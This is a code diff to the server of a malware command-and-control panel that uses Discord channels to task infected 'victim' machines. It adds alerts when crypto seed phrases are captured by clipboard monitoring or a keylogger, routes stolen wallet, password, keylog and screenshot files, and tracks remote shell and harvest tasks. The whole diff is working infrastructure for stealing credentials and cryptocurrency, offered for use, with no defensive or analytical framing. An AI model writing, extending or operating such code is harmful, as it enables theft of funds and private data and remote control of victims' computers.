@@ -8,6 +8,8 @@ import { ArtifactStatus } from '@prisma/client';
 import { processArtifact } from './artifact';
 import { publish } from '../lib/bus';
 import { env } from '../lib/env';
+import { notify, notifyVictimNew } from './notify';
+import { isTaskQueuedAck, parseResultName } from '../lib/discord';
 
 type DiscordConfig = {
   botToken?: string;
@@ -170,10 +172,36 @@ async function pollChannels(): Promise<void> {
     let messages: Message[];
     try {
       messages = await rest<Message[]>('GET', `/channels/${link.channelId}/messages${query}`);
+      if (link.missingAt) {
+        await prisma.discordLink.update({ where: { id: link.id }, data: { missingAt: null } }).catch(() => undefined);
+        await prisma.event.create({ data: { victimId: link.victimId, kind: 'discord_channel_restored', data: { channelId: link.channelId } } }).catch(() => undefined);
+        await notify({
+          kind: 'discord_channel_restored',
+          victimId: link.victimId,
+          title: 'Discord channel restored',
+          body: `${link.victim.hostname} · ${link.channelId}`,
+          link: `/victims/${link.victimId}`,
+          dedupeKey: `channel_restored:${link.channelId}`,
+          dedupeMs: 5 * 60_000
+        }).catch(() => undefined);
+        link.missingAt = null;
+      }
     } catch (error) {
       const text = error instanceof Error ? error.message : '';
       if (text.endsWith('404') || text.endsWith('403')) {
-        await prisma.discordLink.update({ where: { id: link.id }, data: { lastMessageId: '0' } }).catch(() => undefined);
+        await prisma.discordLink.update({ where: { id: link.id }, data: { lastMessageId: '0', missingAt: new Date() } }).catch(() => undefined);
+        if (!link.missingAt) {
+          await prisma.event.create({ data: { victimId: link.victimId, kind: 'discord_channel_missing', data: { channelId: link.channelId } } }).catch(() => undefined);
+          await notify({
+            kind: 'discord_channel_missing',
+            victimId: link.victimId,
+            title: 'Discord channel missing',
+            body: `${link.victim.hostname} · channel ${link.channelId} was deleted or is unreadable`,
+            link: `/victims/${link.victimId}`,
+            dedupeKey: `channel_missing:${link.channelId}`,
+            dedupeMs: 30 * 60_000
+          }).catch(() => undefined);
+        }
       }
       continue;
     }
@@ -198,10 +226,14 @@ async function ensureLinks(): Promise<void> {
     return;
   }
   const channels = await rest<Channel[]>('GET', `/guilds/${guildId}/channels`);
+  const liveIds = new Set(channels.map((channel) => channel.id));
+  const ignored = new Set((await prisma.discordIgnore.findMany({ select: { channelId: true } })).map((row) => row.channelId));
   for (const channel of channels) {
     if (!channel.name.startsWith('sync-')) continue;
+    if (ignored.has(channel.id)) continue;
     const existing = await prisma.discordLink.findUnique({ where: { channelId: channel.id } });
     if (existing) {
+      if (existing.missingAt) await prisma.discordLink.update({ where: { id: existing.id }, data: { missingAt: null } }).catch(() => undefined);
       if (!existing.webhookUrl) await ensureWebhook(existing.id, existing.channelId);
       continue;
     }
@@ -209,25 +241,54 @@ async function ensureLinks(): Promise<void> {
     const split = raw.lastIndexOf('-');
     const hostname = (split > 0 ? raw.slice(0, split) : raw).slice(0, 100) || 'discord-host';
     const username = (split > 0 ? raw.slice(split + 1) : 'unknown').slice(0, 100) || 'unknown';
-    const victim = await prisma.victim.upsert({
+    const known = await prisma.victim.findUnique({
       where: { buildId_hostname_username: { buildId: build.id, hostname, username } },
-      update: { lastHeartbeatAt: new Date(), status: 'online' },
-      create: {
-        buildId: build.id,
-        hostname,
-        username,
-        os: 'windows',
-        arch: 'x86_64',
-        profile: build.profile,
-        status: 'online',
-        tags: ['discord'],
-        deviceTokenEnc: sealSecret(randomToken(32))
-      }
+      include: { discord: true }
     });
-    const created = await prisma.discordLink.create({ data: { channelId: channel.id, guildId, victimId: victim.id } });
-    await ensureWebhook(created.id, channel.id);
-    await prisma.event.create({ data: { victimId: victim.id, kind: 'discord_link', data: { channelId: channel.id } } });
-    await publish({ type: 'victim.new', victimId: victim.id, at: Date.now(), data: { hostname, transport: 'discord' } });
+    let victim = known;
+    let fresh = false;
+    if (!victim) {
+      victim = await prisma.victim.create({
+        data: {
+          buildId: build.id,
+          hostname,
+          username,
+          os: 'windows',
+          arch: 'x86_64',
+          profile: build.profile,
+          status: 'online',
+          tags: ['discord'],
+          deviceTokenEnc: sealSecret(randomToken(32))
+        },
+        include: { discord: true }
+      });
+      fresh = true;
+    } else {
+      await prisma.victim.update({ where: { id: victim.id }, data: { lastHeartbeatAt: new Date(), status: 'online' } }).catch(() => undefined);
+    }
+    if (victim.discord && liveIds.has(victim.discord.channelId) && victim.discord.channelId !== channel.id) {
+      // The victim already has a live channel; this is a second sync- channel.
+      continue;
+    }
+    let linkId: string;
+    if (victim.discord) {
+      // The channel was recreated with a new id: move the link instead of
+      // creating a second row for the same victim.
+      await prisma.discordLink.update({
+        where: { id: victim.discord.id },
+        data: { channelId: channel.id, guildId, lastMessageId: '0', webhookUrl: null, missingAt: null }
+      });
+      linkId = victim.discord.id;
+    } else {
+      const created = await prisma.discordLink.create({ data: { channelId: channel.id, guildId, victimId: victim.id } });
+      linkId = created.id;
+    }
+    await ensureWebhook(linkId, channel.id);
+    await prisma.event.create({ data: { victimId: victim.id, kind: fresh ? 'discord_link' : 'discord_relink', data: { channelId: channel.id } } }).catch(() => undefined);
+    if (fresh) {
+      await notifyVictimNew(victim).catch(() => undefined);
+      await publish({ type: 'victim.new', victimId: victim.id, at: Date.now(), data: { hostname, transport: 'discord' } });
+    }
     log(`linked ${channel.name} -> ${victim.id}`);
   }
 }
@@ -299,7 +360,25 @@ async function handleMessage(link: { channelId: string; victimId: string }, mess
     try {
       await handleAttachment(link, message, attachment);
     } catch (error) {
-      await prisma.event.create({ data: { victimId: link.victimId, kind: 'artifact_failed', data: { name: attachment.filename, error: error instanceof Error ? error.message : 'download_failed' } } }).catch(() => undefined);
+      const reason = error instanceof Error ? error.message : 'download_failed';
+      const name = basename(attachment.filename);
+      const key = `artifact_failed:${link.victimId}:${name}`;
+      const duplicate = await prisma.event.findFirst({
+        where: { victimId: link.victimId, kind: 'artifact_failed', data: { path: ['name'], equals: name }, createdAt: { gte: new Date(Date.now() - 30 * 60_000) } },
+        select: { id: true }
+      }).catch(() => null);
+      if (!duplicate) {
+        await prisma.event.create({ data: { victimId: link.victimId, kind: 'artifact_failed', data: { name, error: reason } } }).catch(() => undefined);
+      }
+      await notify({
+        kind: 'artifact_failed',
+        victimId: link.victimId,
+        title: 'Attachment failed',
+        body: `${name}: ${reason}`,
+        link: `/victims/${link.victimId}`,
+        dedupeKey: key,
+        dedupeMs: 30 * 60_000
+      }).catch(() => undefined);
     }
   }
 }
@@ -315,8 +394,7 @@ async function handleText(victimId: string, message: Message): Promise<void> {
   if (dispatched > 0) return;
   if (content === 'ping') return;
   if (content.startsWith('pong')) return;
-  if (/^Task .* queued$/.test(content)) return;
-  const seconds = Math.floor(Date.now() / 1000);
+  if (isTaskQueuedAck(content)) return;
 
   if (content.startsWith('wallet detected:')) {
     await prisma.event.create({ data: { victimId, kind: 'wallet_detected', data: { text: norm(content) } } });
@@ -335,7 +413,16 @@ async function handleText(victimId: string, message: Message): Promise<void> {
   if (/^(clipboard|charset)?\s*(seed|xprv|clave privada)/i.test(content)) {
     const value = content.includes(':') ? content.slice(content.lastIndexOf(':') + 1).trim() : '';
     if (value) {
-      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'clipboard', value: norm(value), source: 'clipboard' } } });
+      const clean = norm(value);
+      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'clipboard', value: clean, source: 'clipboard' } } });
+      await notify({
+        kind: 'seed',
+        victimId,
+        title: 'Seed found',
+        body: clean.slice(0, 160),
+        link: `/victims/${victimId}`,
+        dedupeKey: `seed:${victimId}:${createHash('sha256').update(clean).digest('hex')}`
+      }).catch(() => undefined);
     }
     return;
   }
@@ -358,12 +445,24 @@ async function handleText(victimId: string, message: Message): Promise<void> {
     const words = content.split(/\s+/).length;
     if (words === 12 || words === 18 || words === 24) {
       pendingSeed.delete(victimId);
-      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'bip39', words, value: content, source: 'keylogger' } } });
+      const clean = norm(content);
+      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'bip39', words, value: clean, source: 'keylogger' } } });
+      await notify({
+        kind: 'seed',
+        victimId,
+        title: 'Seed found',
+        body: clean.slice(0, 160),
+        link: `/victims/${victimId}`,
+        dedupeKey: `seed:${victimId}:${createHash('sha256').update(clean).digest('hex')}`
+      }).catch(() => undefined);
       return;
     }
   }
+  // Terminal text closes shell output and the pseudo-task used to ask the agent
+  // to cancel. Crypto tasks finish with an artifact or a result JSON; closing
+  // them here would cut them short.
   await prisma.task.updateMany({
-    where: { victimId, status: 'running', discordMessageId: { not: null }, leaseUntil: { gt: new Date() } },
+    where: { victimId, name: { in: ['shell', 'cancel'] }, status: 'running', discordMessageId: { not: null }, leaseUntil: { gt: new Date() } },
     data: { status: 'done', result: { output: norm(content) } as never, finishedAt: new Date(), leaseUntil: null }
   });
 }
@@ -418,7 +517,10 @@ async function ingestFile(link: { channelId: string; victimId: string }, externa
   const info = await stat(path);
   const lower = name.toLowerCase();
   const prefix = lower.split('-')[0]!;
-  const module = lower.endsWith('.png') || prefix === 'screenshot' ? 'screenshot'
+  const result = parseResultName(name);
+  if (result) await closeTaskFromResult(link.victimId, result, path).catch(() => undefined);
+  const module = result ? 'result'
+    : lower.endsWith('.png') || prefix === 'screenshot' ? 'screenshot'
     : prefix === 'wallets' || lower.startsWith('wallets') ? 'wallets'
     : lower.includes('passwords') || lower.includes('keys') || lower.includes('seeds') || prefix === 'keylogs' ? 'keylogs'
     : lower.endsWith('.zip') ? 'harvest'
@@ -439,14 +541,88 @@ async function ingestFile(link: { channelId: string; victimId: string }, externa
   const taskName = module === 'harvest' ? 'harvest' : module === 'screenshot' ? 'screenshot' : module === 'wallets' ? 'scan_wallets' : '';
   if (taskName) {
     await prisma.task.updateMany({
-      where: { victimId: link.victimId, name: taskName, status: 'running' },
+      where: {
+        victimId: link.victimId,
+        name: taskName,
+        discordMessageId: { not: null },
+        OR: [{ status: 'running' }, { status: 'error', error: { startsWith: 'timeout' } }]
+      },
       data: { status: 'done', result: { artifactId: artifact.id } as never, finishedAt: new Date(), leaseUntil: null }
     });
   }
   await processArtifact(artifact.id);
 }
 
+const ARTIFACT_TASKS = new Set(['scan_wallets', 'screenshot', 'harvest']);
+const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
+
+async function closeTaskFromResult(
+  victimId: string,
+  result: { name: string; id: string },
+  path: string
+): Promise<void> {
+  let payload: { status?: string; error?: string | null; result?: unknown };
+  try {
+    payload = JSON.parse(await readFile(path, 'utf8')) as typeof payload;
+  } catch {
+    return;
+  }
+  const status = payload.status;
+  if (status !== 'ok' && status !== 'error' && status !== 'cancelled') return;
+  const task = (UUID_RE.test(result.id)
+    ? await prisma.task.findFirst({ where: { id: result.id, victimId } })
+    : null)
+    ?? await prisma.task.findFirst({
+      where: {
+        victimId,
+        name: result.name,
+        discordMessageId: { not: null },
+        OR: [{ status: { in: ['running', 'queued'] } }, { status: 'error', error: { startsWith: 'timeout' } }]
+      },
+      orderBy: { createdAt: 'desc' }
+    });
+  if (!task) return;
+  const body = (payload.result && typeof payload.result === 'object' ? payload.result : {}) as never;
+  if (status === 'ok' && ARTIFACT_TASKS.has(result.name)) {
+    // The ZIP/PNG is the real completion signal for artifact tasks.
+    await prisma.task.update({ where: { id: task.id }, data: { result: body } });
+    return;
+  }
+  const error = status === 'ok' ? null : String(payload.error ?? `${result.name} failed`).slice(0, 2000);
+  await prisma.task.update({
+    where: { id: task.id },
+    data: {
+      status: status === 'ok' ? 'done' : status === 'cancelled' ? 'cancelled' : 'error',
+      result: body,
+      error,
+      finishedAt: new Date(),
+      leaseUntil: null
+    }
+  });
+  await prisma.event.create({ data: { victimId, kind: 'task_result', data: { taskId: task.id, name: result.name, status } } }).catch(() => undefined);
+  if (error) {
+    await notify({
+      kind: 'task_error',
+      victimId,
+      title: `Task failed: ${result.name}`,
+      body: error,
+      link: `/victims/${victimId}`,
+      dedupeKey: `task_error:${task.id}`,
+      dedupeMs: 30 * 60_000
+    }).catch(() => undefined);
+  }
+}
+
 async function dispatchTasks(): Promise<void> {
+  const now = new Date();
+  await prisma.task.updateMany({
+    where: { status: 'queued', victim: { discord: { is: null } } },
+    data: { status: 'error', error: 'discord_unlinked: victim has no Discord channel', finishedAt: now, leaseUntil: null }
+  });
+  await prisma.task.updateMany({
+    where: { status: 'running', discordMessageId: { not: null }, leaseUntil: { lt: now } },
+    data: { status: 'error', error: 'timeout: no result before the lease expired', finishedAt: now, leaseUntil: null }
+  });
   const tasks = await prisma.task.findMany({
     where: { status: 'queued', notBefore: { lte: new Date() }, victim: { discord: { isNot: null } } },
     orderBy: [{ priority: 'desc' }, { createdAt: 'asc' }],
@@ -458,7 +634,14 @@ async function dispatchTasks(): Promise<void> {
     if (!link) continue;
     const channel = link.channelId;
     const text = commandFor(task.name, task.params as Record<string, unknown>);
-    if (!text) continue;
+    if (!text) {
+      await prisma.task.update({ where: { id: task.id }, data: { status: 'error', error: `unsupported_task: ${task.name}`, finishedAt: new Date(), leaseUntil: null } });
+      continue;
+    }
+    if (link.missingAt) {
+      await prisma.task.update({ where: { id: task.id }, data: { status: 'error', error: 'discord_channel_missing: recreate the channel or re-link it', finishedAt: new Date(), leaseUntil: null } });
+      continue;
+    }
     try {
       const messageId = await send(link, text);
       if (!messageId) throw new Error('webhook_unavailable');
@@ -468,7 +651,10 @@ async function dispatchTasks(): Promise<void> {
       });
       lastPing.set(channel, Date.now());
     } catch (error) {
-      await prisma.task.update({ where: { id: task.id }, data: { error: error instanceof Error ? error.message : 'send_failed' } });
+      await prisma.task.update({
+        where: { id: task.id },
+        data: { status: 'error', error: `discord_send_failed: ${error instanceof Error ? error.message : 'send_failed'}`, finishedAt: new Date(), leaseUntil: null }
+      });
     }
   }
 }
